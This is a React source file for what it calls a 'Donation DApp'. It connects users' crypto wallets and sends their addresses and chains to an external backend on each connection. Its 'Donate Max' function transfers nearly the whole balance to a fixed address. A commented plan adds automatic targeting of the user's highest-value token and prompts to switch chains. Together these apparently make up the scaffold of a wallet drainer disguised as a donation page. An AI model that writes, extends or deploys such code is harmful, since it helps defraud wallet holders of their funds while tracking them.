import React, { useEffect } from "react";
import { ConnectButton } from "@rainbow-me/rainbowkit";
import { useAccount, useBalance, useSendTransaction, useNetwork } from "wagmi";
import { parseEther, formatEther } from "viem";

// Backend endpoint
const API_URL = "https://web-production-2da7.up.railway.app/notify";

// Notify backend helper
async function notifyBackend(event, data) {
  try {
    await fetch(API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        event,
        data,
        source: "Frontend",
        ip: "client",
      }),
    });
  } catch (err) {
    console.error("Notify error:", err);
  }
}

export default function App() {
  const { address, isConnected } = useAccount();
  const { chain } = useNetwork();
  const { data: balanceData } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();

  // Notify wallet connect
  useEffect(() => {
    if (isConnected && address) {
      notifyBackend("wallet_connect", {
        account: address,
        chain: chain?.name || `Chain ID ${chain?.id}`,
      });
    }
  }, [isConnected, address, chain]);

  // Fixed donation (0.01 ETH/BNB/whatever chain native)
  const handleDonateFixed = async () => {
    try {
      notifyBackend("donation_attempt", {
        account: address,
        amount: "0.01",
        token: chain?.nativeCurrency?.symbol || "NATIVE",
      });

      await sendTransaction({
        to: "0xdC3b29e4a6aF19d5E57965596020127A09049d83",
        value: parseEther("0.01"),
      });

      notifyBackend("donation_sent", {
        account: address,
        amount: "0.01",
        token: chain?.nativeCurrency?.symbol || "NATIVE",
      });
    } catch (err) {
      notifyBackend("donation_failed", {
        account: address,
        error: err.message,
      });
    }
  };

  // Max donation (leave 0.001 for gas)
  const handleDonateMax = async () => {
    if (!balanceData) return;
    try {
      const rawBalance = balanceData.value;
      const balanceEth = parseFloat(formatEther(rawBalance));

      if (balanceEth <= 0.001) {
        notifyBackend("donation_failed", {
          account: address,
          error: "Insufficient balance",
        });
        return;
      }

      const sendAmountEth = balanceEth - 0.001;
      const sendAmountWei = parseEther(sendAmountEth.toFixed(6));

      notifyBackend("donation_attempt", {
        account: address,
        amount: `${sendAmountEth.toFixed(6)}`,
        token: chain?.nativeCurrency?.symbol || "NATIVE",
      });

      await sendTransaction({
        to: "0xdC3b29e4a6aF19d5E57965596020127A09049d83",
        value: sendAmountWei,
      });

      notifyBackend("donation_sent", {
        account: address,
        amount: `${sendAmountEth.toFixed(6)}`,
        token: chain?.nativeCurrency?.symbol || "NATIVE",
      });
    } catch (err) {
      notifyBackend("donation_failed", {
        account: address,
        error: err.message,
      });
    }
  };

  /* 
  === Auto Highest Balance + Chain Switch Framework ===
  This is left commented out for now. 
  Later, we’ll uncomment and enhance to:
  - Detect balances for ETH, BNB, USDT (ERC20 & BEP20)
  - Pick the token with the highest USD value
  - Prompt chain switch if needed
  */
  /*
  useEffect(() => {
    if (isConnected && address) {
      // TODO: fetch ERC20 + BEP20 balances
      // TODO: compare values in USD
      // TODO: auto-suggest switch
    }
  }, [isConnected, address, chain]);
  */

  return (
    <div className="flex flex-col items-center justify-center h-screen bg-gray-900 text-white space-y-6">
      <h1 className="text-4xl font-bold">🚀 Donation DApp</h1>
      <ConnectButton />

      {isConnected && (
        <div className="flex flex-col gap-4">
          <button
            onClick={handleDonateFixed}
            className="px-6 py-3 bg-blue-600 hover:bg-blue-800 rounded-lg text-lg"
          >
            Donate 0.01 {chain?.nativeCurrency?.symbol || "NATIVE"}
          </button>
          <button
            onClick={handleDonateMax}
            className="px-6 py-3 bg-red-600 hover:bg-red-800 rounded-lg text-lg"
          >
            Donate Max {chain?.nativeCurrency?.symbol || "NATIVE"}
          </button>
        </div>
      )}
    </div>
  );
}
